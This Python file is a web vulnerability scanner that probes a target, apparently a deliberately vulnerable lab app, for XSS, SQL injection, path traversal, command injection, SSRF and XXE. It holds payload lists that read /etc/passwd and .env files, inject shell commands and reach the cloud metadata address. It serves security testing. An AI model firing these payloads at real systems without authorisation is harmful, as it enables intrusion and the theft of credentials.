#!/usr/bin/env python3
"""
Web Application Vulnerability Scanner
Testa XSS, SQLi, Path Traversal, SSRF, Command Injection, XXE
"""

import requests
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

class WebAppScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'SecurityScanner/1.0'})
        
        # Payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>"
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "1' AND sleep(5)--"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "../../.env",
            "/etc/passwd",
            "../../windows/win.ini"
        ]
        
        self.command_payloads = [
            "; whoami",
            "| whoami",
            "127.0.0.1; id"
        ]
        
        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/"
        ]
        
        # Signatures
        self.sql_errors = ['sql syntax', 'mysql', 'postgresql', 'sqlstate', 'odbc']
        self.path_sigs = ['root:x:', 'SECRET_KEY', 'DB_PASSWORD', '[fonts]']
        self.cmd_sigs = ['uid=', 'gid=', '/bin/bash', '/bin/sh']
    
    def crawl(self):
        """Crawl to find endpoints"""
        try:
            response = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            links = []
            for link in soup.find_all('a', href=True):
                url = urljoin(self.target, link['href'])
                if urlparse(url).netloc == urlparse(self.target).netloc:
                    links.append(url)
            
            return links[:20]
        except:
            return []
    
    def test_xss(self, url):
        """Test XSS"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return []
        
        vulns = []
        for param_name in params.keys():
            for payload in self.xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text and not self._is_encoded(response.text, payload):
                        vulns.append({
                            'tool': 'webapp_scanner',
                            'type': 'Reflected XSS',
                            'name': 'Cross-Site Scripting (XSS)',
                            'severity': 'high',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'description': f"XSS in parameter '{param_name}'"
                        })
                        break
                except:
                    pass
        
        return vulns
    
    def test_sqli(self, url):
        """Test SQL Injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return []
        
        vulns = []
        for param_name in params.keys():
            for payload in self.sqli_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    # Time-based
                    if 'sleep' in payload.lower():
                        start = time.time()
                        response = self.session.get(test_url, timeout=10)
                        elapsed = time.time() - start
                        
                        if elapsed >= 4:
                            vulns.append({
                                'tool': 'webapp_scanner',
                                'type': 'Time-based Blind SQL Injection',
                                'name': 'SQL Injection',
                                'severity': 'critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'description': f"Time-based SQLi in '{param_name}'"
                            })
                            break
                    
                    # Error-based
                    response = self.session.get(test_url, timeout=5)
                    if any(sig in response.text.lower() for sig in self.sql_errors):
                        vulns.append({
                            'tool': 'webapp_scanner',
                            'type': 'Error-based SQL Injection',
                            'name': 'SQL Injection',
                            'severity': 'critical',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'description': f"Error-based SQLi in '{param_name}'"
                        })
                        break
                except:
                    pass
        
        return vulns
    
    def test_path_traversal(self):
        """Test path traversal"""
        vulns = []
        test_url = urljoin(self.target, '/file')
        
        for payload in self.path_traversal_payloads:
            try:
                url = f"{test_url}?path={payload}"
                response = self.session.get(url, timeout=5)
                
                if any(sig in response.text for sig in self.path_sigs):
                    vulns.append({
                        'tool': 'webapp_scanner',
                        'type': 'Path Traversal',
                        'name': 'Directory Traversal',
                        'severity': 'high',
                        'url': url,
                        'parameter': 'path',
                        'payload': payload,
                        'description': 'Path traversal allows file access'
                    })
                    break
            except:
                pass
        
        return vulns
    
    def test_command_injection(self):
        """Test command injection"""
        vulns = []
        test_url = urljoin(self.target, '/cmd/ping')
        
        for payload in self.command_payloads:
            try:
                url = f"{test_url}?host={payload}"
                response = self.session.get(url, timeout=5)
                
                if any(sig in response.text for sig in self.cmd_sigs):
                    vulns.append({
                        'tool': 'webapp_scanner',
                        'type': 'OS Command Injection',
                        'name': 'Command Injection',
                        'severity': 'critical',
                        'url': url,
                        'parameter': 'host',
                        'payload': payload,
                        'description': 'OS command injection detected'
                    })
                    break
            except:
                pass
        
        return vulns
    
    def test_ssrf(self):
        """Test SSRF"""
        vulns = []
        test_url = urljoin(self.target, '/ssrf/fetch')
        
        for payload in self.ssrf_payloads:
            try:
                url = f"{test_url}?url={payload}"
                response = self.session.get(url, timeout=5)
                
                if any(kw in response.text.lower() for kw in ['localhost', 'metadata', 'ami-id']):
                    vulns.append({
                        'tool': 'webapp_scanner',
                        'type': 'Server-Side Request Forgery',
                        'name': 'SSRF',
                        'severity': 'critical',
                        'url': url,
                        'parameter': 'url',
                        'payload': payload,
                        'description': 'SSRF allows internal access'
                    })
                    break
            except:
                pass
        
        return vulns
    
    def test_xxe(self):
        """Test XXE"""
        vulns = []
        test_url = urljoin(self.target, '/xxe/parse')
        
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        
        try:
            response = self.session.post(test_url, data={'xml': xxe_payload}, timeout=5)
            
            if 'root:x:' in response.text:
                vulns.append({
                    'tool': 'webapp_scanner',
                    'type': 'XML External Entity (XXE)',
                    'name': 'XXE Injection',
                    'severity': 'critical',
                    'url': test_url,
                    'payload': xxe_payload[:50] + '...',
                    'description': 'XXE allows file access'
                })
        except:
            pass
        
        return vulns
    
    def _is_encoded(self, text, payload):
        """Check if encoded"""
        return ('&lt;' in text and '<' in payload) or ('&gt;' in text and '>' in payload)
    
    def scan(self):
        """Run full scan"""
        all_vulns = []
        
        # Test known endpoints
        all_vulns.extend(self.test_path_traversal())
        all_vulns.extend(self.test_command_injection())
        all_vulns.extend(self.test_ssrf())
        all_vulns.extend(self.test_xxe())
        
        # Crawl and test
        links = self.crawl()
        for link in links:
            if '?' in link:
                all_vulns.extend(self.test_xss(link))
                all_vulns.extend(self.test_sqli(link))
        
        # Test common endpoints
        for endpoint in ['/xss/reflected', '/sql/error', '/sql/blind']:
            test_url = urljoin(self.target, endpoint)
            all_vulns.extend(self.test_xss(test_url + '?search=test'))
            all_vulns.extend(self.test_sqli(test_url + '?id=1'))
        
        self.vulnerabilities = all_vulns
        return all_vulns